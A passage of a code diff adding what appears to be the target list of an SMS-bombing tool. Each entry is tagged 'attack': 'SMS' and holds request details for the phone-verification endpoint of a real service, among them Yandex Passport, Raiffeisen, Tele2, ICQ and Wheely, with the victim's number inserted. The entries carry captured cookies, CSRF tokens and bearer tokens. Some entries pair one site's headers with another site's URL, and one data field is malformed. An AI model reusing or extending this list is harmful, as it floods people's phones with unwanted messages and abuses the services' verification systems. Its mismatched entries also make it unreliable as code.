+                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
+                'Host': 'passport.yandex.ru',
+                'Origin': 'https://passport.yandex.ru',
+                'Referer': 'https://passport.yandex.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0],
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            'data': {
+                'track_id': 'str4',
+                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
+                'number': number,
+                'isCodeWithFormat': 'True',
+                'confirm_method': 'by_sms'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'passport.yandex.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '69',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': 'anonymous-consents=%5B%5D; abtc=787EC619484F2A7B4C166802604530920674; abtc-text-button_2=default_text; abtc-story-test_5=story_exist; abtc-checkout-button_2=active_button; abtc-crm-test_3=owm_crm; abtc-fast-buy-listing_1=fast_buy_listing; cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-cbd86fdb8-r9fqp; AKA_A2=A; akaas_sn_www_shoppinglive_ru=2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201; userWasLogin=true; JSESSIONID=9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp; exp_id=default_text/fast_buy_listing/story_exist/active_button/owm_crm; sl-cart=2d001440-4742-42b0-a799-97ec1f86ea05',
+                'origin': 'https://www.shoppinglive.ru',
+                'referer': 'https://www.shoppinglive.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                'mobilePhone': number,
+                'CSRFToken': '00bc3ff8-f081-483d-ab0e-bb026785114f'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.shoppinglive.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.shoppinglive.ru/phone-verification/send-code',
+            'headers': {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
+                'Connection': 'keep-alive',
+                'Content-Length': '24',
+                'Content-Type': 'application/json',
+                'Cookie': '__ddg1_=xl7dki0N0qhMTlUiS9iY; deviceId=d8e3d55a4da157282898a72208499cfd; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
+                'Host': 'ap.leomax.ru',
+                'Origin': 'https://auth.k8s.leomax.ru',
+                'Referer': 'https://auth.k8s.leomax.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {"phone": f"+{number}"}
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'ap.leomax.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://ap.leomax.ru/siteapi/auth/authcode',
+            'headers': {
+
+            },
+            'data': {
+                'number': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'oapi.raiffeisen.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
+            'headers': {
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Connection': 'keep-alive',
+                'Content-Length': '75',
+                'Content-type': 'application/json',
+                'Cookie': 'city=izhevsk; city_is_confirmed=1; XSRF-TOKEN=eyJpdiI6IlZwTE9tYUtoVTZhVkpYQ3JnUW9PbFE9PSIsInZhbHVlIjoidWlST2xNa1pvbzVRdDVqY1daRTVQYXBuK25Mb1R6bFR3bG5SYUJZZ05wYVZHQ3BIcjBVZXBGOFNlYVdLUUMrMWU4cGpHRnZlcHV5N2tGdThIbWdiMGc9PSIsIm1hYyI6ImNiYTQ2YzcwMDk5ZGE4YzJiMDE3NTcxOTJhNDVjMjViYTY1NWI0NGYxMDI2ODEzNDYyMDQ4Mzc1NzJiZWMxMWQifQ%3D%3D; b-apteka_session=eyJpdiI6IjcrTWJyM21aa3lvME1UaXcrRVIxWkE9PSIsInZhbHVlIjoiN29pME5hZ05RYU9Cc2lVMW1Vdk0yMG4zUjBhVUdaUFwvWnFYNzBubG9TNkdPcnk0WDZZRE00c1BTRlRISXRhczdxMm5QTWYrOTlaWDVORGFsMmszdmJ3PT0iLCJtYWMiOiJmNWRkYzJhMWMzMWUyYTY3MzBlOGQzNWFmOTdkYjA3OWE4ZTIyOWE1NDI3ZTU2OWNmYzA1MDRhYzM3ZTgwZGFmIn0%3D',
+                'Host': 'b-apteka.ru',
+                'Origin': 'https://b-apteka.ru',
+                'Referer': 'https://b-apteka.ru/lk/login',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+                'User-Agent': user_agent()[0],
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            'data': {
+                'phone': number,
+                '_token': 'G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'b-apteka.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://b-apteka.ru/lk/send_confirm_code',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '18',
+                'content-type': 'application/json',
+                'cookie': 'language=ru-RU; user-separator=part1; language=ru-RU; session-cookie=1726063975251ab3f60c6a976940ac7285525d89dcb927fe1d60ec46cae73ef49059592ea3ef326a51e3f2f08d6353e1; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.tele2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; Test_try={%225500001%22:1}; csrf-token-name=csrftoken; JSESSIONID=yC1eMKbGBrnLyukyFZ7-at-Q5ZKp8MA6JlTGL06bkjt_o0QFjCZQ!-550992005; NSC_ESNS=a0366d2d-14a5-136c-9678-c223c06207fc_0765662115_1895704033_00000000019867210692; csrf-token-value=1726063c60de4ab6c4943efca7bc968c764caec84dde01522c0a8f7ae9d5608427191ccb48f76353',
+                'origin': 'https://msk.tele2.ru',
+                'referer': 'https://msk.tele2.ru/?pageParams=askForRegion%3Dtrue',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'tele2-user-agent': 'web',
+                'user-agent': user_agent()[0],
+                'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
+                'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
+                'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            'data': {
+                'sender': 'Tele2'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'msk.tele2.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://msk.tele2.ru/api/validation/number/{phone}',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '0',
+                'cookie': 'favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; _cfuvid=7qo8NDtZ3jsi4WBHzUZ1snKrNVf93UHPrbDxrEKBVTc-1668027960075-0-604800000; searchPlaceholder=Apple%2520MacBook; BASKET_COUNT=0; __cf_bm=FUlOJxiHHM2NF7yFFQqufh5_RxESugWb5_Gt93wl8Fw-1668027962-0-AUwqQ15CtADoXAccMeA3g0WbzmrgCD2/QcylobSrjQdLiQx1cJfIsx+AGxZCn0ZH21eecYku/+MJ07yrSE3tSrQY/RjEr4r9V4a8ZJsYdmI9f27uS9tdy0FEuyTpuyHcty6s6eGB7+V0UkUkn4A/Hkt81gTBzVLAKShMCv7SUKwb0oYRN35EAd5y3SGSzZHghg==',
+                'origin': 'https://www.svyaznoy.ru',
+                'referer': 'https://www.svyaznoy.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-requested-with': 'XMLHttpRequest'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.svyaznoy.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.svyaznoy.ru/api/v2/sms-verification-code/{phone[1:]}',
+            'headers': {
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'fr-FR,fr',
+                'Cache-Control': 'max-age=0',
+                'Connection': 'keep-alive',
+                'Content-Length': '16',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Cookie': 'PHPSESSID=uutvbqgetdp7hrktod41sk70b3; _fbp=fb.1.1668028718954.379549720',
+                'Host': 'www.frotels.com',
+                'Origin': 'https://www.frotels.com',
+                'Referer': 'https://www.frotels.com/appsendsms.php',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'Sec-Fetch-Dest': 'iframe',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': user_agent()[0]
+            },
+            'data': {
+                'mobno': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.frotels.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.frotels.com/appsendsms.php',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'ru',
+                'content-length': '60',
+                'content-type': 'application/json',
+                'dnt': '1',
+                'origin': 'https://wheely.com',
+                'referer': 'https://wheely.com/',
+                'sec-ch-ua': 'Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': user_agent()[0],
+                'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
+            },
+            'data': {
+                'app_id': '55e085968a5da59241000001',
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'api.wheely.com',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://api.wheely.com/v6/auth/oauth/token',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '141',
+                'content-type': 'application/json',
+                'origin': 'https://web.icq.com',
+                'referer': 'https://web.icq.com/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                '{"reqId': '85231-1668029727',
+                'params': number,
+                'devId': 'ic1rtwz1s1Hj1O0r',
+                'application': 'icq"}}'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'u.icq.net',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://u.icq.net/api/v89/rapi/auth/sendCode',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '231',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'cookie': 'uid=UbGokWNsHtsam06bAwXMAg==; .ASPXANONYMOUS=aLtF3Euak0aI0S9e42PDHw; _SL_=6.83.; _ipl=6.83.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_CREDITSELECTION=Test_000195_A; AB_CREDITSELECTION_DIRECT=never; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8GIymPxtm1FFmKVQVGA7i3eSw5EuDlEAI6yoUR-lLFuhs6PZSKZSYC69yd-ImQtg7VMTVs-YREVxcAm9pTBRdll6qirhjMSoXp20s8hxsTbAL6O3BZFBlhYZ_8Nf00Qvpcpt1dmrE5oyGos4nyJcoes; __cf_bm=ZjbtEUV9dl1mEJNlE4WHlqfswV2gFvh28__bRnhiZbc-1668030211-0-AUO7xru8loJtNzO2Ffv6rNJrjJnYGpb5KYOMSIokmdlEk8VF/XY1xx/aKWrJWuHqh1Bqhq8nPhFdWeylZhzgjy1pKA+V7XExgqMhepF+s63F; _cfuvid=VvENPoiZRWhMICqFKfY413RVyf_TwT4WmJFCPZPVJiM-1668030211698-0-604800000',
+                'origin': 'https://my.sravni.ru',
+                'referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fuser%2Fprofile',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0]
+            },
+            'data': {
+                '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
+                'phone': number,
+                'returnUrl': '/user/profile'
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'my.sravni.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://my.sravni.ru/signin/code',
+            'headers': {
+                'accept': 'application/json, text/plain, */*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
+                'content-length': '17',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': 'region=1; deliveryTypeId=1; standardShopId=2527; luuid=73c0fa54-2927-4afa-a372-6004f8647bb6; suuid=d739609b-436f-4502-a032-67dba9fdc97e; XSRF-TOKEN=eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZDczYzBmYTU0LTI5MjctNGFmYS1hMzcyLTYwMDRmODY0N2JiNjBmZDJlNzVkMjNlMDQ5MWQ4MGRkMTgzOGU0NmY1YWYwODliMTJhYWMiLCJpYXQiOjE2NjgwMzA1OTguMjU0ODMyLCJuYmYiOjE2NjgwMzA1OTguMjU0ODM0LCJleHAiOjE2NjgxMTY5OTguMjUxNTQsInN1YiI6IiIsInNjb3BlcyI6W10sInNwbGl0X3NlZ21lbnQiOjl9.B-C8hM2_ZfrY4QdYvmqbZQFgfUbcrOYb40F_5rpzUuS086BFGi1WelZVdavOhFeUKR7o8AT9rLKIQ7SvO_i4WwB1gJ7NCPwqNq8saUHSMIqoZruJiNPOTa_fyYAJGXaOLekVK984_84tohSyVPp6CgM1HtXD8lvKSD1tnDhtP7SjFaazKnD4YwkHeT0mJsi4smjX-XsMJN9Z3A2y5-0GT6HEol93jKlXNw3wsBR_7ZJ_vpIT9waE9w-tIs21HvCW6Ad6j5Okn0lO2MtYZ5KuP63UBFj3BERVx7GJTIRKbjFMzS6tb0jw1pQkMX_k86d181wsPZagCOW9cxSMpcxP1O8rDP_MVLk-Y53c3Ap3R-3EhdWYyex74Pua6ZOBerNu_Eg6wM2KcTQQOyOY3jdtQ5BUg7orMtkmxA5ua6NGlaJeNmDqbQDwsZSMF7kbpzI5YRjg8lSy6rUHUJQCHDKCSHaVCVnO65IjNru1qZ5B0AgWeNE85vf5EgDx5IvviHzVCz4QAkztlhqpebCZ4rM992-As26eSZZN_gYY1e38xehoXFwS1tDhWr5jWQMbgOlAfSj649353BXO-iPQ10_NS81g-1579ZxF6f9HtmuGe7gm_5WtNkEpH2SSDaVasXNo45Gh23DMWGLw1JA64LfU3RNlHMdoRDPfVfgRNzzG5rs; split_segment_amount=11; aid=eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D',
+                'origin': 'https://www.vprok.ru',
+                'referer': 'https://www.vprok.ru/',
+                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': 'macOS',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user_agent()[0],
+                'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
+            },
+            'data': {
+                'phone': number
+            }
+        },
+        {
+            'info': {
+                'country': 'ALL',
+                'attack': 'SMS',
+                'website': 'www.vprok.ru',
+                'anonymous': 'No'
+            },
+            'method': 'post',
+            'url': 'https://www.vprok.ru/as_send_pin',
+            'headers': {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'fr-FR,fr',
